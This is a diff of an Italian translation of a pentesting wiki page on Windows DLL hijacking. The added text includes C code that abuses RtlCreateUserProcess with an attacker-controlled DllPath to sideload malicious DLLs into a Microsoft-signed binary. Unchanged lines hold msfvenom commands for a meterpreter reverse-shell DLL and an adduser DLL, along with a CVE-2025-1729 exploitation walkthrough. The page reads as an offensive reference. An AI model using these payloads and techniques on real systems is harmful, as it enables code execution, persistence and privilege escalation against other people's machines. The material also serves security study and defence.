@@ -5,116 +5,209 @@
 
 ## Informazioni di base
 
-Il DLL Hijacking comporta la manipolazione di un'applicazione fidata per caricare un DLL malevolo. Questo termine comprende diverse tattiche come **DLL Spoofing, Injection e Side-Loading**. È principalmente utilizzato per l'esecuzione di codice, per ottenere persistenza e, meno comunemente, per l'escalation dei privilegi. Nonostante l'attenzione sull'escalation qui, il metodo di hijacking rimane coerente attraverso gli obiettivi.
+DLL Hijacking consiste nel manipolare un'applicazione fidata affinché carichi una DLL malevola. Questo termine comprende diverse tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene utilizzato principalmente per code execution, ottenere persistence e, meno frequentemente, privilege escalation. Nonostante qui ci si concentri sull'escalation, il metodo di hijacking rimane coerente rispetto all'obiettivo.
 
 ### Tecniche comuni
 
-Vengono impiegati diversi metodi per il DLL hijacking, ciascuno con la propria efficacia a seconda della strategia di caricamento del DLL dell'applicazione:
+Sono impiegati diversi metodi per il DLL hijacking, ciascuno con l'efficacia variabile a seconda della strategia di caricamento delle DLL dell'applicazione:
 
-1. **Sostituzione DLL**: Sostituire un DLL genuino con uno malevolo, utilizzando eventualmente il DLL Proxying per preservare la funzionalità del DLL originale.
-2. **Hijacking dell'ordine di ricerca DLL**: Posizionare il DLL malevolo in un percorso di ricerca prima di quello legittimo, sfruttando il modello di ricerca dell'applicazione.
-3. **Hijacking di DLL fantasma**: Creare un DLL malevolo per un'applicazione da caricare, pensando che sia un DLL richiesto non esistente.
-4. **Reindirizzamento DLL**: Modificare i parametri di ricerca come `%PATH%` o i file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione al DLL malevolo.
-5. **Sostituzione DLL WinSxS**: Sostituire il DLL legittimo con un corrispondente malevolo nella directory WinSxS, un metodo spesso associato al side-loading di DLL.
-6. **Hijacking DLL con percorso relativo**: Posizionare il DLL malevolo in una directory controllata dall'utente con l'applicazione copiata, somigliando alle tecniche di Binary Proxy Execution.
+1. **DLL Replacement**: Sostituire una DLL genuina con una malevola, opzionalmente usando DLL Proxying per preservare la funzionalità originale della DLL.
+2. **DLL Search Order Hijacking**: Inserire la DLL malevola in un percorso di ricerca che precede quello legittimo, sfruttando il pattern di ricerca dell'applicazione.
+3. **Phantom DLL Hijacking**: Creare una DLL malevola che l'applicazione caricherà, pensando sia una DLL richiesta ma inesistente.
+4. **DLL Redirection**: Modificare i parametri di ricerca come %PATH% o i file .exe.manifest / .exe.local per indirizzare l'applicazione verso la DLL malevola.
+5. **WinSxS DLL Replacement**: Sostituire la DLL legittima con una versione malevola nella directory WinSxS, metodo spesso associato al DLL side-loading.
+6. **Relative Path DLL Hijacking**: Posizionare la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, simile alle tecniche di Binary Proxy Execution.
 
-## Trovare DLL mancanti
+## Trovare Dll mancanti
 
-Il modo più comune per trovare DLL mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **impostando** i **seguenti 2 filtri**:
+Il modo più comune per trovare Dll mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **impostando** i **seguenti 2 filtri**:
 
 ![](<../../../images/image (961).png>)
 
 ![](<../../../images/image (230).png>)
 
-e mostrare solo l'**Attività del File System**:
+e mostrare solo la **File System Activity**:
 
 ![](<../../../images/image (153).png>)
 
-Se stai cercando **DLL mancanti in generale**, puoi **lasciarlo** in esecuzione per alcuni **secondi**.\
-Se stai cercando una **DLL mancante all'interno di un eseguibile specifico**, dovresti impostare **un altro filtro come "Nome processo" "contiene" "\<nome exec>", eseguirlo e fermare la cattura degli eventi**.
+Se stai cercando **dll mancanti in generale** lascia questo in esecuzione per alcuni **secondi**.\
+Se stai cercando una **dll mancante in un eseguibile specifico** dovresti impostare **un altro filtro tipo "Process Name" "contains" "\<exec name>", eseguirlo e interrompere la cattura degli eventi**.
 
-## Sfruttare DLL mancanti
+## Sfruttare Dll mancanti
 
-Per poter elevare i privilegi, la migliore possibilità che abbiamo è quella di **scrivere un DLL che un processo privilegiato cercherà di caricare** in alcuni **luoghi dove verrà cercato**. Pertanto, saremo in grado di **scrivere** un DLL in una **cartella** dove il **DLL viene cercato prima** della cartella dove si trova il **DLL originale** (caso strano), oppure saremo in grado di **scrivere in una cartella dove il DLL verrà cercato** e il **DLL originale non esiste** in nessuna cartella.
+Per poter effettuare privilege escalation, la nostra miglior opportunità è poter **scrivere una dll che un processo privilegiato cercherà di caricare** in alcuni dei percorsi in cui verrà cercata. Pertanto, saremo in grado di **scrivere** una dll in una **cartella** dove la **dll viene cercata prima** della cartella contenente la **dll originale** (caso atipico), oppure saremo in grado di **scrivere in una cartella dove la dll verrà cercata** e la dll originale **non esiste** in nessuna cartella.
 
-### Ordine di ricerca DLL
+### Ordine di ricerca delle Dll
 
-**All'interno della** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come i DLL vengono caricati specificamente.**
+**Nella** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come le DLL vengono caricate nello specifico.**
 
-**Le applicazioni Windows** cercano i DLL seguendo un insieme di **percorsi di ricerca predefiniti**, aderendo a una particolare sequenza. Il problema del DLL hijacking sorge quando un DLL dannoso è strategicamente posizionato in una di queste directory, assicurando che venga caricato prima del DLL autentico. Una soluzione per prevenire questo è garantire che l'applicazione utilizzi percorsi assoluti quando si riferisce ai DLL di cui ha bisogno.
+Le applicazioni Windows cercano le DLL seguendo una serie di percorsi di ricerca predefiniti, rispettando una sequenza particolare. Il problema del DLL hijacking sorge quando una DLL dannosa è posizionata strategicamente in una di queste directory, assicurandosi di essere caricata prima della DLL autentica. Una soluzione per evitare questo è far sì che l'applicazione utilizzi percorsi assoluti quando si riferisce alle DLL di cui ha bisogno.
 
-Puoi vedere l'**ordine di ricerca DLL sui sistemi a 32 bit** qui sotto:
+Di seguito puoi vedere l'ordine di ricerca delle DLL su sistemi a 32-bit:
 
-1. La directory da cui l'applicazione è stata caricata.
-2. La directory di sistema. Usa la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il percorso di questa directory. (_C:\Windows\System32_)
-3. La directory di sistema a 16 bit. Non esiste una funzione che ottiene il percorso di questa directory, ma viene cercata. (_C:\Windows\System_)
-4. La directory di Windows. Usa la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il percorso di questa directory. (_C:\Windows_)
-5. La directory corrente.
-6. Le directory elencate nella variabile di ambiente PATH. Nota che questo non include il percorso per applicazione specificato dalla chiave di registro **App Paths**. La chiave **App Paths** non viene utilizzata quando si calcola il percorso di ricerca DLL.
+1. The directory from which the application loaded.
+2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
+3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
+4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
+1. (_C:\Windows_)
+5. The current directory.
+6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.
 
-Questo è l'**ordine di ricerca predefinito** con **SafeDllSearchMode** abilitato. Quando è disabilitato, la directory corrente sale al secondo posto. Per disabilitare questa funzionalità, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo su 0 (il predefinito è abilitato).
+Quello è l'ordine di ricerca **di default** con **SafeDllSearchMode** abilitato. Quando è disabilitato la current directory sale al secondo posto. Per disabilitare questa funzione, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (di default è abilitato).
 
 Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.
 
-Infine, nota che **un DLL potrebbe essere caricato indicando il percorso assoluto invece del solo nome**. In tal caso, quel DLL è **cercato solo in quel percorso** (se il DLL ha dipendenze, queste verranno cercate come se fossero state caricate solo per nome).
+Infine, nota che **una dll può essere caricata indicando il path assoluto invece che solo il nome**. In quel caso la dll verrà **cercata solo in quel percorso** (se la dll ha dipendenze, queste verranno cercate come se la dll fosse stata appena caricata per nome).
 
-Ci sono altri modi per alterare l'ordine di ricerca, ma non li spiegherò qui.
+Esistono altri modi per alterare l'ordine di ricerca ma non li spiegherò qui.
 
-#### Eccezioni all'ordine di ricerca DLL dalla documentazione Windows
+### Forzare il sideloading tramite RTL_USER_PROCESS_PARAMETERS.DllPath
 
-Alcune eccezioni all'ordine di ricerca DLL standard sono annotate nella documentazione Windows:
+Un modo avanzato per influenzare in modo deterministico il DLL search path di un processo appena creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le API native di ntdll. Fornendo una directory controllata dall'attaccante qui, un processo target che risolve una DLL importata per nome (nessun path assoluto e senza usare i flag di caricamento sicuro) può essere costretto a caricare una DLL malevola da quella directory.
 
-- Quando si incontra un **DLL che condivide il proprio nome con uno già caricato in memoria**, il sistema salta la ricerca abituale. Invece, esegue un controllo per il reindirizzamento e un manifesto prima di tornare al DLL già in memoria. **In questo scenario, il sistema non esegue una ricerca per il DLL**.
-- Nei casi in cui il DLL è riconosciuto come un **DLL noto** per la versione corrente di Windows, il sistema utilizzerà la sua versione del DLL noto, insieme a qualsiasi DLL dipendente, **saltando il processo di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene un elenco di questi DLL noti.
-- Se un **DLL ha dipendenze**, la ricerca di questi DLL dipendenti viene condotta come se fossero indicati solo dai loro **nomi di modulo**, indipendentemente dal fatto che il DLL iniziale sia stato identificato tramite un percorso completo.
+Idea chiave
+- Costruire i process parameters con RtlCreateProcessParametersEx e fornire un DllPath personalizzato che punti alla cartella controllata (es. la directory dove risiede il tuo dropper/unpacker).
+- Creare il processo con RtlCreateUserProcess. Quando il binario target risolve una DLL per nome, il loader consulterà questo DllPath fornito durante la risoluzione, permettendo uno sideloading affidabile anche quando la DLL malevola non è colocata con l'EXE target.
 
-### Elevare i privilegi
+Note/limitazioni
+- Questo influenza il processo figlio che viene creato; è diverso da SetDllDirectory, che influenza solo il processo corrente.
+- Il target deve importare o chiamare LoadLibrary per una DLL usando il nome (nessun path assoluto e senza usare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
+- KnownDLLs e path assoluti hardcoded non possono essere hijackati. Forwarded exports e SxS possono cambiare la precedenza.
 
-**Requisiti**:
+Esempio minimo in C (ntdll, wide strings, gestione errori semplificata):
+```c
+#include <windows.h>
+#include <winternl.h>
+#pragma comment(lib, "ntdll.lib")
 
-- Identificare un processo che opera o opererà con **privilegi diversi** (movimento orizzontale o laterale), che **manca di un DLL**.
-- Assicurarsi che ci sia **accesso in scrittura** per qualsiasi **directory** in cui il **DLL** sarà **cercato**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory all'interno del percorso di sistema.
+// Prototype (not in winternl.h in older SDKs)
+typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
+PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
+PUNICODE_STRING ImagePathName,
+PUNICODE_STRING DllPath,
+PUNICODE_STRING CurrentDirectory,
+PUNICODE_STRING CommandLine,
+PVOID Environment,
+PUNICODE_STRING WindowTitle,
+PUNICODE_STRING DesktopInfo,
+PUNICODE_STRING ShellInfo,
+PUNICODE_STRING RuntimeData,
+ULONG Flags
+);
 
-Sì, i requisiti sono complicati da trovare poiché **per impostazione predefinita è piuttosto strano trovare un eseguibile privilegiato mancante di un DLL** ed è ancora **più strano avere permessi di scrittura su una cartella del percorso di sistema** (non puoi per impostazione predefinita). Ma, in ambienti mal configurati, questo è possibile.\
-Nel caso tu sia fortunato e ti trovi a soddisfare i requisiti, potresti controllare il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se il **principale obiettivo del progetto è bypassare UAC**, potresti trovare lì un **PoC** di un Dll hijacking per la versione di Windows che puoi utilizzare (probabilmente cambiando solo il percorso della cartella in cui hai permessi di scrittura).
+typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
+PUNICODE_STRING NtImagePathName,
+ULONG Attributes,
+PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
+PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
+PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
+HANDLE ParentProcess,
+BOOLEAN InheritHandles,
+HANDLE DebugPort,
+HANDLE ExceptionPort,
+PRTL_USER_PROCESS_INFORMATION ProcessInformation
+);
 
-Nota che puoi **controllare i tuoi permessi in una cartella** facendo:
+static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
+DWORD n = GetModuleFileNameW(h, out, cch);
+for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
+}
+
+int wmain(void) {
+// Target Microsoft-signed, DLL-hijackable binary (example)
+const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";
+
+// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
+wchar_t dllDir[MAX_PATH];
+DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);
+
+UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
+RtlInitUnicodeString(&uImage, image);
+RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
+RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
+RtlInitUnicodeString(&uCurDir, dllDir);
+
+RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
+(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
+RtlCreateUserProcess_t pRtlCreateUserProcess =
+(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");
+
+RTL_USER_PROCESS_PARAMETERS *pp = NULL;
+NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
+NULL, NULL, NULL, NULL, NULL, 0);
+if (st < 0) return 1;
+
+RTL_USER_PROCESS_INFORMATION pi = {0};
+st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
+if (st < 0) return 1;
+
+// Resume main thread etc. if created suspended (not shown here)
+return 0;
+}
+```
+Operational usage example
+- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
+- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.
+
+This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.
+
+
+#### Exceptions on dll search order from Windows docs
+
+Certain exceptions to the standard DLL search order are noted in Windows documentation:
+
+- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
+- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
+- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.
+
+### Escalating Privileges
+
+**Requirements**:
+
+- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
+- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.
+
+Sì, i requisiti sono complicati da trovare perché **di default è piuttosto raro trovare un eseguibile privilegiato a cui manca una dll** ed è ancora **più raro avere i permessi di scrittura su una cartella del system path** (di norma non li hai). Tuttavia, in ambienti mal configurati ciò è possibile.\
+Se per fortuna trovi una situazione che soddisfa i requisiti, puoi dare un'occhiata al progetto [UACME](https://github.com/hfiref0x/UACME). Anche se **l'obiettivo principale del progetto è bypass UAC**, potresti trovare lì una **PoC** di a Dll hijaking per la versione di Windows che ti interessa (probabilmente cambiando solo il percorso della cartella su cui hai i permessi di scrittura).
+
+Note that you can **check your permissions in a folder** doing:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-E **controlla i permessi di tutte le cartelle all'interno di PATH**:
+E **verifica i permessi di tutte le cartelle all'interno di PATH**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-Puoi anche controllare le importazioni di un eseguibile e le esportazioni di un dll con:
+Puoi anche verificare gli imports di un eseguibile e gli exports di una dll con:
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-Per una guida completa su come **abuse Dll Hijacking per escalare privilegi** con permessi di scrittura in una **cartella di System Path**, controlla:
+Per una guida completa su come **abuse Dll Hijacking to escalate privileges** con i permessi di scrittura in una **System Path folder** consulta:
+
 
 {{#ref}}
 writable-sys-path-+dll-hijacking-privesc.md
 {{#endref}}
 
-### Strumenti automatizzati
+### Strumenti automatici
 
-[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) controllerà se hai permessi di scrittura su qualsiasi cartella all'interno del system PATH.\
-Altri strumenti automatizzati interessanti per scoprire questa vulnerabilità sono le **funzioni di PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._
+[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificherà se hai permessi di scrittura su qualsiasi cartella all'interno di system PATH.\
+Altri strumenti automatici interessanti per scoprire questa vulnerabilità sono le **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._
 
 ### Esempio
 
-Nel caso tu trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo sarebbe **creare un dll che esporta almeno tutte le funzioni che l'eseguibile importerà da esso**. Comunque, nota che Dll Hijacking è utile per [escalare da Medium Integrity level a High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da [**High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare un dll valido** all'interno di questo studio sul dll hijacking focalizzato sul dll hijacking per l'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-Inoltre, nella **prossima sezione** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **modelli** o per creare un **dll con funzioni non richieste esportate**.
+Nel caso trovassi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo sarebbe **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. Nota comunque che Dll Hijacking è utile per [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **how to create a valid dll** all'interno di questo studio su dll hijacking focalizzato sull'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Inoltre, nella **sezione successiva** puoi trovare alcuni **basic dll codes** che potrebbero essere utili come **templates** o per creare una **dll with non required functions exported**.
 
-## **Creazione e compilazione di Dlls**
+## **Creating and compiling Dlls**
 
 ### **Dll Proxifying**
 
-Fondamentalmente, un **Dll proxy** è un Dll capace di **eseguire il tuo codice malevolo quando caricato** ma anche di **esporre** e **funzionare** come **previsto** **rilanciando tutte le chiamate alla vera libreria**.
+Fondamentalmente un **Dll proxy** è una Dll capace di **eseguire il tuo codice malevolo quando viene caricata** ma anche di **esporsi** e **funzionare** come **expected** inoltrando tutte le chiamate alla libreria reale.
 
-Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che vuoi proxificare e **generare un dll proxificato** oppure **indicare il Dll** e **generare un dll proxificato**.
+Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la library** che vuoi proxify e **generare una proxified dll** o **indicare la Dll** e **generare una proxified dll**.
 
 ### **Meterpreter**
 
@@ -130,9 +223,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dl
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
-### Il tuo
+### Il proprio
 
-Nota che in diversi casi il Dll che compili deve **esportare diverse funzioni** che verranno caricate dal processo vittima; se queste funzioni non esistono, il **binario non sarà in grado di caricarle** e l'**exploit fallirà**.
+Nota che, in diversi casi, la Dll che compili deve **export several functions** che verranno caricate dal processo vittima. Se queste funzioni non esistono, il **binary won't be able to load** le stesse e l'**exploit will fail**.
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -213,20 +306,20 @@ break;
 return TRUE;
 }
 ```
-## Case Study: CVE-2025-1729 - Escalazione dei privilegi utilizzando TPQMAssistant.exe
+## Caso di studio: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe
 
-Questo caso dimostra **Phantom DLL Hijacking** nel TrackPoint Quick Menu di Lenovo (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.
+Questo caso dimostra **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.
 
 ### Dettagli della vulnerabilità
 
 - **Componente**: `TPQMAssistant.exe` situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
-- **Attività programmata**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguita quotidianamente alle 9:30 AM nel contesto dell'utente connesso.
-- **Permessi della directory**: Scrivibile da `CREATOR OWNER`, consentendo agli utenti locali di inserire file arbitrari.
-- **Comportamento di ricerca DLL**: Tenta di caricare `hostfxr.dll` dalla sua directory di lavoro per prima e registra "NAME NOT FOUND" se mancante, indicando la precedenza della ricerca nella directory locale.
+- **Attività pianificata**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguita giornalmente alle 9:30 AM nel contesto dell'utente connesso.
+- **Permessi della directory**: scrivibile da `CREATOR OWNER`, permettendo agli utenti locali di posizionare file arbitrari.
+- **Comportamento di ricerca delle DLL**: tenta di caricare `hostfxr.dll` dalla sua directory di lavoro per prima e registra "NAME NOT FOUND" se è assente, indicando la precedenza della ricerca nella directory locale.
 
-### Implementazione dell'exploit
+### Exploit Implementation
 
-Un attaccante può posizionare un stub `hostfxr.dll` malevolo nella stessa directory, sfruttando la DLL mancante per ottenere l'esecuzione di codice nel contesto dell'utente:
+Un attaccante può posizionare uno stub malevolo `hostfxr.dll` nella stessa directory, sfruttando la DLL mancante per ottenere l'esecuzione di codice nel contesto dell'utente:
 ```c
 #include <windows.h>
 
@@ -238,25 +331,28 @@ MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
 return TRUE;
 }
 ```
-### Flusso di Attacco
+### Flusso d'attacco
 
-1. Come utente standard, inserisci `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
-2. Aspetta che il compito programmato venga eseguito alle 9:30 AM nel contesto dell'utente attuale.
-3. Se un amministratore è connesso quando il compito viene eseguito, il DLL malevolo viene eseguito nella sessione dell'amministratore con integrità media.
-4. Collega tecniche standard di bypass UAC per elevare da integrità media a privilegi di SYSTEM.
+1. Come utente standard, posizionare `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
+2. Attendere che l'attività pianificata venga eseguita alle 9:30 AM nel contesto dell'utente corrente.
+3. Se un amministratore è connesso quando l'attività viene eseguita, la DLL dannosa viene eseguita nella sessione dell'amministratore a medium integrity.
+4. Concatenare tecniche standard di UAC bypass per elevare i privilegi da medium integrity a privilegi SYSTEM.
 
 ### Mitigazione
 
-Lenovo ha rilasciato la versione UWP **1.12.54.0** tramite il Microsoft Store, che installa TPQMAssistant in `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, rimuove il compito programmato vulnerabile e disinstalla i componenti Win32 legacy.
+Lenovo ha rilasciato la versione UWP **1.12.54.0** tramite il Microsoft Store, che installa TPQMAssistant in `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, rimuove l'attività pianificata vulnerabile e disinstalla i componenti Win32 legacy.
 
 ## Riferimenti
 
-- [CVE-2025-1729 - Elevazione di Privilegi Utilizzando TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
+- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
 - [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
 
 
 - [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
 - [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
+
+
+- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
 
 
 {{#include ../../../banners/hacktricks-training.md}}
